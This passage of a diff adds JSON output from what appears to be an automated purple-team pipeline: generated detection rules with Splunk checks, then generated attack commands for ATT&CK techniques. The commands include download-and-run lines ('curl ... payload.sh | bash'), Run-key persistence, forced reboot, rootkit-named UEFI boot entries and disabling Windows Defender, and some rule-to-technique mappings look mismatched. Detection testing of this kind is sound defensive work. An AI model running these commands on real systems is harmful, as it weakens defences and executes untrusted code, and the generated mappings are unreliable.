+        "level": "high",
+        "tags": [
+          "attack.t1021.002"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Remote Services",
+        "generation_method": "langchain",
+        "id": "cd5ed070-f017-45e4-ad01-1703c71fdd3a",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 1,
+          "query_time_ms": 583.0
+        }
+      },
+      {
+        "title": "Suspicious Process Creation from winlogon.exe",
+        "description": "Detects process creation events where winlogon.exe spawns a child process commonly associated with command-line or script execution, which may indicate malicious code execution in a high-privilege context.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": null
+        },
+        "detection": {
+          "selection_parent": {
+            "ParentImage|endswith": "\\winlogon.exe"
+          },
+          "selection_child": {
+            "Image|endswith": [
+              "\\powershell.exe",
+              "\\cmd.exe"
+            ]
+          },
+          "selection_command": {
+            "CommandLine|regex": "(?i)-(enc|e|encodedcommand|command|c|noprofile|executionpolicy)\\b"
+          },
+          "condition": "selection_parent and selection_child and selection_command"
+        },
+        "falsepositives": [
+          "Legitimate system maintenance tasks that involve winlogon.exe spawning command-line tools (extremely rare)",
+          "Security software or patch management tools operating at system level (uncommon but possible)"
+        ],
+        "level": "high",
+        "tags": [
+          "attack.discovery",
+          "attack.t1010"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Application Window Discovery",
+        "generation_method": "langchain",
+        "id": "4cd24f5b-433b-4a3a-b8ba-296ac68403c9",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 27,
+          "query_time_ms": 441.0
+        }
+      },
+      {
+        "title": "Detect Kernel API Address Collection via ZwCreateSection and ntoskrnl.exe",
+        "description": "Detects processes that reference the kernel image ntoskrnl.exe and invoke the ZwCreateSection API, indicative of Input Capture (T1056.001) where malware builds an import table of kernel functions.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": null
+        },
+        "detection": {
+          "selection": {
+            "Image|contains": "ntoskrnl.exe",
+            "CommandLine|contains": "ZwCreateSection"
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Normal OS boot loading of ntoskrnl.exe",
+          "Legitimate driver installations or updates that invoke ZwCreateSection"
+        ],
+        "level": "medium",
+        "tags": [
+          "attack.t1056.001",
+          "attack.collection",
+          "attack.input_capture"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Input Capture",
+        "generation_method": "langchain",
+        "id": "65139d6a-515a-4e15-99ae-76fd7691712f",
+        "siem_verification": {
+          "detected": false,
+          "status": "success",
+          "message": "Verification complete",
+          "events_found": 0,
+          "query_time_ms": 494.0
+        }
+      },
+      {
+        "title": "Suspicious Process with Encrypted Channel Activity",
+        "description": "Detects processes using UDP/TCP protocols with potential base64 encoded commands, indicative of CosmicStrand's encrypted C2 channels.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": [
+              "\\powershell.exe",
+              "\\cmd.exe"
+            ],
+            "CommandLine|contains|any": [
+              "udp",
+              "tcp",
+              "-Protocol",
+              "-Port"
+            ],
+            "CommandLine|re": "[A-Za-z0-9+/=]{20,}"
+          },
+          "filter": {
+            "Image|startswith": "C:\\Windows\\System32\\",
+            "ParentImage|endswith|any": [
+              "\\services.exe",
+              "\\svchost.exe"
+            ],
+            "User": "NT AUTHORITY\\SYSTEM"
+          },
+          "condition": "selection and not filter"
+        },
+        "falsepositives": [
+          "Legitimate network administration tools",
+          "Automation scripts using encoded commands"
+        ],
+        "level": "high",
+        "tags": [
+          "attack.command_and_control",
+          "attack.t1573"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Encrypted Channel",
+        "generation_method": "langchain",
+        "id": "c0380cec-65ee-40f5-808a-05d59b968ebd",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 88,
+          "query_time_ms": 377.0
+        }
+      },
+      {
+        "title": "Exploit Public-Facing Application via UEFI Firmware",
+        "description": "Detects exploitation of UEFI firmware to gain initial access to the system",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": [
+              "\\powershell.exe",
+              "\\cmd.exe"
+            ],
+            "CommandLine|contains|all": [
+              "-enc",
+              "-Command",
+              "-NoProfile",
+              "-ExecutionPolicy Bypass"
+            ]
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Legitimate administrative or scripting activities using PowerShell or cmd.exe",
+          "Authorized software installations or updates"
+        ],
+        "level": "critical",
+        "tags": [
+          "attack.initial_access",
+          "attack.t1569",
+          "custom.mitre_exploit_public_facing_application"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Exploit Public-Facing Application",
+        "generation_method": "langchain",
+        "id": "163d2f91-0ec9-4de0-8636-f2714ded951c",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 29,
+          "query_time_ms": 351.00000000000006
+        }
+      },
+      {
+        "title": "System Information Discovery via Internet Connectivity Test",
+        "description": "Detects system information discovery by testing internet connectivity to specific IPs",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection": {
+            "Image|endswith": [
+              "\\cmd.exe",
+              "\\powershell.exe",
+              "\\wmic.exe"
+            ],
+            "CommandLine|contains|all": [
+              "systeminfo",
+              "hostname",
+              "wmic",
+              "Get-ComputerInfo"
+            ],
+            "ParentImage|endswith": [
+              "\\cmd.exe",
+              "\\powershell.exe",
+              "\\wmic.exe"
+            ],
+            "DestinationIp|in": [
+              "8.8.8.8",
+              "222.222.67.208"
+            ]
+          },
+          "condition": "selection"
+        },
+        "falsepositives": [
+          "Legitimate system administration activities",
+          "Network connectivity tests"
+        ],
+        "level": "medium",
+        "tags": [
+          "attack.discovery",
+          "attack.t1566"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "System Information Discovery",
+        "generation_method": "langchain",
+        "id": "262c7e5d-0dae-4457-afb3-9fc689391f3d",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 24,
+          "query_time_ms": 545.0
+        }
+      },
+      {
+        "title": "Create or Modify System Process \u2013 Suspicious PowerShell or Regsvr32 Invocation",
+        "description": "Detects creation of system processes (PowerShell or Regsvr32) with command\u2011line arguments commonly used for persistence and code execution, such as encoded commands or registration flags.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection_powershell": {
+            "Image|endswith": "\\powershell.exe",
+            "CommandLine|regex": "(?i)-(enc|e|encodedcommand|command|noprof|executionpolicy\\s+bypass)\\b"
+          },
+          "selection_regsvr32": {
+            "Image|endswith": "\\regsvr32.exe",
+            "CommandLine|contains": "/i"
+          },
+          "condition": "selection_powershell or selection_regsvr32"
+        },
+        "falsepositives": [
+          "Legitimate administrative scripts that invoke PowerShell with -NoProfile or -ExecutionPolicy Bypass for system maintenance.",
+          "Software installers or deployment tools that use Regsvr32 with the /i flag to register legitimate DLLs."
+        ],
+        "level": "medium",
+        "tags": [
+          "attack.persistence",
+          "attack.t1543.003",
+          "attack.t1059.001"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Create or Modify System Process",
+        "generation_method": "langchain",
+        "id": "0e70a8ce-146a-426f-ac96-f8ab3663dd49",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 6,
+          "query_time_ms": 850.0
+        }
+      },
+      {
+        "title": "Screen Capture via Process Creation and Command Line Indicators",
+        "description": "Detects potential screen capture activity by monitoring processes that invoke known capture utilities or contain screen\u2011capture related keywords in their command line, covering PowerShell, cmd, and third\u2011party tools.",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "selection_ps": {
+            "Image|endswith": "\\powershell.exe",
+            "CommandLine|regex": "(?i)\\b(screenshot|screen\\s?capture|prtsc|snippingtool|capture\\s?screen)\\b"
+          },
+          "selection_cmd": {
+            "Image|endswith": "\\cmd.exe",
+            "CommandLine|regex": "(?i)\\b(screenshot|screen\\s?capture|prtsc|snippingtool)\\b"
+          },
+          "selection_tool": {
+            "Image|endswith": "\\SnippingTool.exe"
+          },
+          "selection_nircmd": {
+            "Image|endswith": "\\nircmd.exe",
+            "CommandLine|contains": "savescreenshot"
+          },
+          "selection_ffmpeg": {
+            "Image|endswith": "\\ffmpeg.exe",
+            "CommandLine|contains": "-f gdigrab"
+          },
+          "condition": "selection_ps or selection_cmd or selection_tool or selection_nircmd or selection_ffmpeg"
+        },
+        "falsepositives": [
+          "Legitimate administrative scripts that capture screenshots for documentation",
+          "Remote support tools that take screenshots during a session",
+          "Automated testing frameworks that record screen activity"
+        ],
+        "level": "medium",
+        "tags": [
+          "attack.t1113",
+          "attack.collection"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Screen Capture",
+        "generation_method": "langchain",
+        "id": "c9d5ceb6-422c-4a4d-9121-1e71e95367a5",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 27,
+          "query_time_ms": 417.0
+        }
+      },
+      {
+        "title": "Phishing: Office Application Spawning Command Shells with Suspicious PowerShell Flags",
+        "description": "Detects Office processes (WINWORD, EXCEL, POWERPNT) launching cmd.exe or powershell.exe with flags commonly used in phishing payloads (encoded commands, -Command, -NoProfile, ExecutionPolicy Bypass).",
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows",
+          "service": "sysmon"
+        },
+        "detection": {
+          "cmd_spawn": {
+            "ParentImage|endswith": [
+              "\\WINWORD.EXE",
+              "\\EXCEL.EXE",
+              "\\POWERPNT.EXE"
+            ],
+            "Image|endswith": "\\cmd.exe"
+          },
+          "ps_spawn": {
+            "ParentImage|endswith": [
+              "\\WINWORD.EXE",
+              "\\EXCEL.EXE",
+              "\\POWERPNT.EXE"
+            ],
+            "Image|endswith": "\\powershell.exe",
+            "CommandLine|regex": "(?i)-(enc|e|encodedcommand)\\b|(?i)-Command\\b|(?i)-NoProfile\\b|(?i)-ExecutionPolicy\\s+Bypass\\b"
+          },
+          "condition": "cmd_spawn or ps_spawn"
+        },
+        "falsepositives": [
+          "Legitimate Office macros that invoke PowerShell or cmd for automation (e.g., data export scripts).",
+          "Administrative scripts launched from Office applications in managed environments."
+        ],
+        "level": "medium",
+        "tags": [
+          "attack.t1566",
+          "attack.initial_access",
+          "attack.phishing",
+          "attack.t1059.001"
+        ],
+        "ttp_id": "unknown",
+        "technique_name": "Phishing",
+        "generation_method": "langchain",
+        "id": "cb26716d-eb73-40ca-b051-ccca1347baf1",
+        "siem_verification": {
+          "detected": true,
+          "status": "success",
+          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
+          "events_found": 27,
+          "query_time_ms": 453.0
+        }
+      }
+    ],
+    "status": "success"
+  },
+  "evaluation": {
+    "status": "success",
+    "summary": {
+      "average_quality_score": 0.6156250000000001
+    }
+  },
+  "attacks": [
+    {
+      "id": "53f7895f-7a52-4025-ae20-acb5d4702ddb",
+      "ttp_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_name": "Pre-OS Boot",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"TestPayload\" /t REG_SZ /d \"cmd.exe /c echo Test Payload > %TEMP%\\test.txt\" /f",
+      "description": "Adds a registry key to run a benign payload on startup",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "The payload will run on startup and create a file in the temp directory",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:37.344865",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.716,
+      "validated": true
+    },
+    {
+      "id": "222fad1c-bf90-46de-a28e-0cc1d37faa89",
+      "ttp_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_name": "Pre-OS Boot",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "powershell -Command \"Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'TestPayload' -Type String -Value 'cmd.exe /c echo Test Payload > %TEMP%\\test.txt' -Force\"",
+      "description": "Adds a registry key to run a benign payload on startup using PowerShell",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "The payload will run on startup and create a file in the temp directory",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:37.344865",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.716,
+      "validated": true
+    },
+    {
+      "id": "324a2a25-c3cd-4554-98cf-943da0a0e08c",
+      "ttp_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_name": "Pre-OS Boot",
+      "tactic": "Persistence",
+      "platform": "windows",
+      "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"TestPayload\" /t REG_SZ /d \"cmd.exe /c echo Test Payload > %TEMP%\\test.txt\" /f && shutdown /r /t 0",
+      "description": "Adds a registry key to run a benign payload on startup and reboots the system",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "The payload will run on startup and create a file in the temp directory, and the system will reboot",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:37.344865",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.716,
+      "validated": true
+    },
+    {
+      "id": "21ae4e78-59ce-424f-9230-c27816a43fe3",
+      "ttp_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_name": "Pre-OS Boot",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "sudo apt-get install -y efibootmgr && sudo efibootmgr -c -d /dev/sda -p 1 -L \"CosmicStrand\" -l \"/EFI/Boot/bootx64.efi\"",
+      "description": "Install efibootmgr and create a new UEFI boot entry for the CosmicStrand rootkit",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "A new UEFI boot entry is created, and the system may reboot to load the rootkit",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:37.971784",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.716,
+      "validated": true
+    },
+    {
+      "id": "55868691-fb6b-44fd-932b-c978b6078889",
+      "ttp_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_id": "288b8c87-9547-470a-ab72-c5b9eb5be038",
+      "technique_name": "Pre-OS Boot",
+      "tactic": "Persistence",
+      "platform": "linux",
+      "command": "sudo apt-get install -y grub-efi-amd64 && sudo grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=CosmicStrand",
+      "description": "Install GRUB UEFI and install the CosmicStrand rootkit as the bootloader",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "GRUB UEFI is installed, and the CosmicStrand rootkit is installed as the bootloader",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:37.972857",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.716,
+      "validated": true
+    },
+    {
+      "id": "08e209a7-e40d-4f59-a100-4088301856b7",
+      "ttp_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_name": "User Execution",
+      "tactic": "Execution",
+      "platform": "windows",
+      "command": "powershell -Command \"Invoke-Item 'C:\\\\\\Windows\\\\\\\\System32\\\\\\\\notepad.exe'\"",
+      "description": "Basic command to execute Notepad via PowerShell, demonstrating user-initiated execution of a trusted application.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Notepad opens as a result of user execution.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.164205",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "3fe0d19f-b852-4be8-8526-c256902d98b0",
+      "ttp_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_name": "User Execution",
+      "tactic": "Execution",
+      "platform": "windows",
+      "command": "cmd.exe /c echo Hello > %TEMP%\\test.txt && start %TEMP%\\test.txt",
+      "description": "Intermediate command that creates a file in the temp directory and then opens it, simulating a user executing a file that was downloaded or created by another process.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "A text file is created and opened by the default associated application.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.164205",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "0ced5b69-6df8-492e-9282-622b3ddb5c99",
+      "ttp_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_name": "User Execution",
+      "tactic": "Execution",
+      "platform": "windows",
+      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('cmd.exe', '/c echo This is a test > %TEMP%\\\\test.txt')\"",
+      "description": "Advanced command using PowerShell to start a new process that creates a file, demonstrating execution of a command by a user-initiated process. However, due to constraints, this exact command is not preferred but is listed for completeness.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "A text file is created in the temp directory, but the use of .NET reflection is not preferred in actual testing scenarios.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:41.164205",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "e4b61de4-3f3a-4c19-b3c0-fba802cfd15b",
+      "ttp_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_name": "User Execution",
+      "tactic": "Execution",
+      "platform": "linux",
+      "command": "wget http://example.com/payload.sh && bash payload.sh",
+      "description": "Basic example of downloading and executing a script from a remote server.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Downloads a script and executes it.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.155745",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "44af6965-52aa-471a-9896-2a56b45c6c10",
+      "ttp_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_name": "User Execution",
+      "tactic": "Execution",
+      "platform": "linux",
+      "command": "curl -s http://example.com/payload.sh | bash",
+      "description": "Intermediate example using curl to download and pipe the script to bash for execution.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Downloads a script and executes it without saving to disk.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.155745",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "6801f63a-473b-47d9-9a07-650ad75e9a85",
+      "ttp_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_id": "0e0d1417-3705-4fa9-8105-c258549ad496",
+      "technique_name": "User Execution",
+      "tactic": "Execution",
+      "platform": "linux",
+      "command": "echo 'bash -c \"echo test > /tmp/test.txt\"' > /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh",
+      "description": "Advanced example creating a script, making it executable, and then executing it to mimic payload deployment.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Creates a script, makes it executable, and executes it to create a test file.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:47:11.155745",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "9cadb7ae-6631-4c90-b2c9-92262045e240",
+      "ttp_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_name": "Function Hooking",
+      "tactic": "Defense Evasion",
+      "platform": "windows",
+      "command": "reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v Load /t REG_SZ /d \"C:\\\\\\\\\\\\\\temp\\\\\\\\\\\\\\\\test.dll\" /f",
+      "description": "Basic example of function hooking by modifying registry to load a custom DLL before a Windows function.",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "Loads a custom DLL before a Windows function, potentially hooking it.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:49:35.948047",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "f6b25131-76a1-4296-8617-c0c4a45de7d5",
+      "ttp_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_name": "Function Hooking",
+      "tactic": "Defense Evasion",
+      "platform": "windows",
+      "command": "powershell -Command \"Add-Type -MemberDefinition '[DllImport(\"user32\")] public static extern int MessageBox(int hWnd, String text, String caption, uint type);' -Name U32 -Namespace W; [W.U32]::MessageBox(0, 'Hello, World!', 'Test', 0)\"",
+      "description": "Intermediate example using PowerShell to define and invoke a Windows API function, simulating function hooking.",
+      "requires_admin": false,
+      "safety_level": "medium",
+      "expected_behavior": "Displays a message box using the Windows API, demonstrating the ability to invoke external functions.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:49:35.948047",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "aba3dcde-ef9b-42f9-a20c-28b6839e6358",
+      "ttp_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_name": "Function Hooking",
+      "tactic": "Defense Evasion",
+      "platform": "windows",
+      "command": "powershell -Command \"$assem = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('DynamicAssembly')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run); $modb = $assem.DefineDynamicModule('DynamicModule'); $tb = $modb.DefineType('MyType', [System.Reflection.TypeAttributes]::Public); $mb = $tb.DefineMethod('MyMethod', [System.Reflection.MethodAttributes]::Public | [System.Reflection.MethodAttributes]::Static, [void], @()); $il = $mb.GetILGenerator(); $il.Emit([System.Reflection.Emit.OpCodes]::Ret); $tb.CreateType(); [MyType]::MyMethod()\"",
+      "description": "Advanced example of generating dynamic assemblies and invoking methods, simulating complex function hooking scenarios.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "Creates and invokes a dynamic method, demonstrating advanced function invocation capabilities.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:49:35.948047",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "bf9d43af-c430-478b-b66b-6d850f25ef00",
+      "ttp_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_name": "Function Hooking",
+      "tactic": "Defense Evasion",
+      "platform": "linux",
+      "command": "LD_PRELOAD=/tmp/libhook.so /bin/cat /etc/passwd",
+      "description": "Basic function hooking using LD_PRELOAD to load a custom shared object that logs or modifies calls to libc functions (e.g., open, read) before executing the target binary.",
+      "requires_admin": false,
+      "safety_level": "low",
+      "expected_behavior": "The libhook.so library is preloaded; when /bin/cat calls functions like open/read, the library's overridden implementations run first, logging a message to stdout or a file, then delegating to the original functions. The content of /etc/passwd is displayed as usual.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:50:04.195481",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "0ea9decf-0853-49f1-b43b-92c1a5386502",
+      "ttp_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_name": "Function Hooking",
+      "tactic": "Defense Evasion",
+      "platform": "linux",
+      "command": "gdb -p $(pidof bash) -ex \"break read\" -ex \"commands\" -ex \"silent\" -ex \"printf \\\"[hook] read called\\n\\\"\" -ex \"continue\" -ex \"end\" -ex \"detach\" -ex \"quit\"",
+      "description": "Intermediate hooking by attaching GDB to a running bash process, setting a breakpoint on the 'read' function, and printing a custom message each time the function is entered.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "GDB attaches to the bash process, pauses execution at each call to read, silently prints \"[hook] read called\" to the console, then continues execution. The bash session continues normally after each hook.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:50:04.195481",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "db4146f8-469a-4e32-ab3e-0cb903d7b1d9",
+      "ttp_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_id": "04ea3056-b162-4397-aa23-c214ab26e940",
+      "technique_name": "Function Hooking",
+      "tactic": "Defense Evasion",
+      "platform": "linux",
+      "command": "LD_AUDIT=/tmp/libaudit.so /usr/bin/ssh -V",
+      "description": "Advanced hooking using the LD_AUDIT interface; a custom audit library receives callbacks for each dynamic symbol resolution, allowing code to run after the original function completes.",
+      "requires_admin": true,
+      "safety_level": "medium",
+      "expected_behavior": "The libaudit.so audit library is loaded; as ssh resolves its dynamic symbols, the audit callbacks are invoked, logging each resolved function (e.g., malloc, write) to a file. The ssh version information is still printed to stdout.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:50:04.195481",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.707,
+      "validated": true
+    },
+    {
+      "id": "6ee799ba-2f67-46ad-829f-6fe27f50a9f4",
+      "ttp_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_name": "Impair Defenses",
+      "tactic": "Defense Evasion",
+      "platform": "windows",
+      "command": "sc.exe stop windefend",
+      "description": "Stopping the Windows Defender service to impair defenses",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "The Windows Defender service will be stopped, potentially weakening the system's defenses.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.234040",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.704,
+      "validated": true
+    },
+    {
+      "id": "ef05ca6a-198a-4078-9faa-560b310eadb3",
+      "ttp_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_name": "Impair Defenses",
+      "tactic": "Defense Evasion",
+      "platform": "windows",
+      "command": "powershell -Command \"Set-ItemProperty -Path 'HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWORD -Force\"",
+      "description": "Disabling Windows Defender using PowerShell to modify registry settings",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "Windows Defender will be disabled by modifying the registry, which could impair the system's ability to detect malware.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.234040",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.704,
+      "validated": true
+    },
+    {
+      "id": "7edbfc56-32ee-4d76-9b50-10a20a500d03",
+      "ttp_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_name": "Impair Defenses",
+      "tactic": "Defense Evasion",
+      "platform": "windows",
+      "command": "reg.exe add 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
+      "description": "Using the registry editor command-line tool to disable Windows Defender",
+      "requires_admin": true,
+      "safety_level": "high",
+      "expected_behavior": "This command disables Windows Defender by adding a registry key, which could weaken system defenses.",
+      "source": "langchain",
+      "generated_at": "2025-12-29T23:46:42.234040",
+      "agent_id": "60cb7c40-bf9d-4246-8a38-8a40e41f424f",
+      "confidence_score": 0.704,
+      "validated": true
+    },
+    {
+      "id": "9be7d20a-bd01-42a6-81be-c959855802c8",
+      "ttp_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_id": "2260f1e8-3ce7-4851-99af-d6a72e175807",
+      "technique_name": "Impair Defenses",
+      "tactic": "Defense Evasion",
+      "platform": "linux",
